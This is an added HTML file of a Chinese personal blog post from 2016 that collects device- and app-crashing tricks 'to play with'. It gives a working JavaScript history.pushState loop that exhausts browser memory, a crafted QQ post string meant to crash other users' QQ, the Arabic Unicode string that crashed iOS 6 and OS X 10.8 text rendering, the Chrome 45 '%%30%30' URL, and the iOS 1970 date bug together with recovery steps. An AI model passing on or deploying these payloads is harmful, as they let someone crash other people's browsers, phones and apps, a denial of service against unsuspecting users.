@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+
+  <meta name="description" content="谁点谁怀孕之代码解析"/>
+
+
+
+
+  <meta name="keywords" content="教你瞎折腾, farwmarth" />
+
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="farwmarth">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.6.0" />
+
+
+
+<link rel="canonical" href="http://www.farwmarth.com/谁点谁怀孕之代码解析/"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.6.0" />
+
+
+
+
+
+
+  
+
+
+
+  <script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+
+
+
+
+
+
+
+    <title> 谁点谁怀孕之代码解析 - farwmarth </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">farwmarth</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/about">
+        <li class="mobile-menu-item">
+          
+          
+            关于
+          
+        </li>
+      </a>
+    
+      <a href="/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            归档
+          
+        </li>
+      </a>
+    
+      <a href="/tags">
+        <li class="mobile-menu-item">
+          
+          
+            标签
+          
+        </li>
+      </a>
+    
+      <a href="/categories">
+        <li class="mobile-menu-item">
+          
+          
+            分类
+          
+        </li>
+      </a>
+    
+      <a href="/douban">
+        <li class="mobile-menu-item">
+          
+          
+            豆瓣
+          
+        </li>
+      </a>
+    
+      <a href="/music">
+        <li class="mobile-menu-item">
+          
+          
+            音乐
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">farwmarth</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/about">
+            
+            
+              关于
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            
+            
+              归档
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/tags">
+            
+            
+              标签
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              分类
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/douban">
+            
+            
+              豆瓣
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/music">
+            
+            
+              音乐
+            
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          谁点谁怀孕之代码解析
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2016-01-22
+        </span>
+        
+        
+      </div>
+    </header>
+
+    
+    
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#iPhone调到1970年变砖"><span class="toc-text">iPhone调到1970年变砖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#触发bug条件与表现"><span class="toc-text">触发bug条件与表现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bug触发表现：iOS设备启动时，卡在苹果Logo，无法继续启动。"><span class="toc-text">Bug触发表现：iOS设备启动时，卡在苹果Logo，无法继续启动。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解决方案"><span class="toc-text">解决方案</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#history-pushstate"><span class="toc-text">history.pushstate()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#android-qq"><span class="toc-text">android qq</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iphone-字符"><span class="toc-text">iphone 字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chrome"><span class="toc-text">Chrome</span></a></li></ol>
+    </div>
+  </div>
+
+
+    <div class="post-content">
+      
+        <p>最近又发现有新的崩溃代码了,打开页面,内存就会被榨干.回想之前也有过特殊字符使iphone白屏的情况.收集一下玩玩.</p>
+<h2 id="iPhone调到1970年变砖"><a href="#iPhone调到1970年变砖" class="headerlink" title="iPhone调到1970年变砖"></a>iPhone调到1970年变砖</h2><h4 id="触发bug条件与表现"><a href="#触发bug条件与表现" class="headerlink" title="触发bug条件与表现"></a>触发bug条件与表现</h4><p>满足以下条件，『时间回归』bug被触发：</p>
+<ul>
+<li>系统版本：iOS 8.0 ~ iOS 9.3 beta 3</li>
+<li>硬件设备：搭载64位处理器的设备（即处理器为A7~A9X的设备）</li>
+<li>进入『设置』-『通用』-『时间与日期』，关闭『自动设置』，并将时间修改为1970年1月1日，分秒任意.</li>
+<li>修改时间后，需要重启设备。</li>
+</ul>
+<a id="more"></a>
+<h4 id="Bug触发表现：iOS设备启动时，卡在苹果Logo，无法继续启动。"><a href="#Bug触发表现：iOS设备启动时，卡在苹果Logo，无法继续启动。" class="headerlink" title="Bug触发表现：iOS设备启动时，卡在苹果Logo，无法继续启动。"></a>Bug触发表现：iOS设备启动时，卡在苹果Logo，无法继续启动。</h4><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>针对所有64位处理器的iOS设备<br>拆机并拆出电池，放置10分钟后重新安装。<br>电量充足的情况下，等待数小时，当Unix时间戳的数值大于等于0，系统时间生效，可正常开机。</p>
+<p><a href="http://www.cnbeta.com/articles/474579.htm" target="_blank" rel="noopener">http://www.cnbeta.com/articles/474579.htm</a></p>
+<h2 id="history-pushstate"><a href="#history-pushstate" class="headerlink" title="history.pushstate()"></a>history.pushstate()</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> total = <span class="string">""</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span></span><br><span class="line"><span class="undefined">        total = total + i.toString();</span></span><br><span class="line"><span class="undefined">        history.pushState(0, 0, total);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>history.pushstate()是HTML5引入的API，pushState将指定的URL添加到浏览器历史里,存储当前历史记录点。 当 i&lt;100000 的时候会循环的将 total记录到浏览器历史里,测试地址<a href="http://www.0xroot.cn/demo.html" target="_blank" rel="noopener">http://www.0xroot.cn/demo.html</a></p>
+<h2 id="android-qq"><a href="#android-qq" class="headerlink" title="android qq"></a>android qq</h2><p>发表说说<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;uin:54432,nick崩死你空间,who:1&#125;</span><br><span class="line">其中“54432”可以随便改，“崩死你”内容也可随便改</span><br></pre></td></tr></table></figure></p>
+<h2 id="iphone-字符"><a href="#iphone-字符" class="headerlink" title="iphone 字符"></a>iphone 字符</h2><ul>
+<li>字符包含英文、阿拉伯文和中文 <a href="https://www.zhihu.com/question/21568134" target="_blank" rel="noopener">https://www.zhihu.com/question/21568134</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Power</span><br><span class="line">　　لُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ 冗</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>控件显示bug,在 iOS 6 或者OS X 10.8中 WebCore,CoreText的显示多种语言时崩溃</p>
+<h2 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h2><p>如果你使用Chrome 45或更老的版本，可以试试在地址栏输入以下字符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://a/%%30%30</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    
+      
+      
+
+
+
+      
+      
+  <div class="post-reward">
+    <input type="checkbox" name="reward" id="reward" hidden />
+    <label class="reward-button" for="reward">赞赏支持</label>
+    <div class="qr-code">
+      
+      
+        <label class="qr-code-image" for="reward">
+          <img class="image" src="/image/reward/wechat.png" title="wechat">
+        </label>
+      
+      
+        <label class="qr-code-image" for="reward">
+          <img class="image" src="/image/reward/alipay.png" title="alipay">
+        </label>
+      
+    </div>
+  </div>
+
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/tags/教你瞎折腾/">教你瞎折腾</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/仓促的战斗模型设计/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">仓促的战斗模型设计</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    
+    
+      <a class="next" href="/恶补键盘知识/">
+        <span class="next-text nav-default">恶补键盘知识</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:wujiyu115@email.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="http://github.com/wujiyu115" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="/farwmwarth" class="iconfont icon-instagram" title="instagram"></a>
+        
+      
+    
+    
+    
+      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+     
+      2011 - 
+    
+    2018
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">farwmarth</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+  
+
+  
+
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  
+
+  
+
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.6.0"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=2.6.0"></script>
+
+  </body>
+</html>
